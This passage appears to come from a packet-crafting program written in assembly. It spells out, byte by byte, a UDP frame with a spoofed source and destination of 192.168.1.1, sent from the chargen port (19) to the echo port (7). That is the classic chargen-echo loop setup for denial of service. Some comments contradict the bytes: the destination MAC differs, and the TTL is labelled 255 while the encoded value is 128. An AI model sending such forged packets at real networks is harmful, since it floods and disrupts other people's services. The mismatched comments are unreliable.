packet:
       /* ethernet - 14 bytes       */
.ascii "\x00\x10\xa4\x10\xe8\x1d"   /* mac dest    00:80:ad:90:5f:64      */
.ascii "\x00\x80\xad\xc6\x18\xbb"   /* mac source  00:80:ad:c6:18:bb      */
.ascii "\x08\x00"                   /* mac options 0806 - ARP, 0800 - IP  */
       /* ip header - 20 bytes      */
.ascii "\x45"                       /* version:4, ihl:5                   */
.ascii "\x00"                       /* type of service:                   */
.ascii "\x00\x1c"                   /* total length ip header + data      */
.ascii "\x00\x00"                   /* id       	     	          */
.ascii "\x00\x00"                   /* flags                              */
.ascii "\x80"                       /* TTL                   : 255        */
.ascii "\x11"                       /* protocol (17(0x11)=UDP)            */	         
.ascii "\xb7\x7e"                   /* checksum 0xb77e (46974)            */
.ascii "\xc0\xa8\x01\x01"           /* ip source       : 192.168.1.1      */
.ascii "\xc0\xa8\x01\x01"           /* ip destination  : 192.168.1.1      */
       /* udp header - 8 bytes      */
.ascii "\x00\x13"                   /* source port 19 (chargen)           */
.ascii "\x00\x07"                   /* destantion port 7 (echo)           */
.ascii "\x00\x08"                   /* total length udp header + data     */
.ascii "\x7c\x71"                   /* checksum 0x7c71 (31857)            */
       /* udp data                  */
/*.ascii "\x61\x62\x63\x64\x65\x66" */  /* DATA                               */
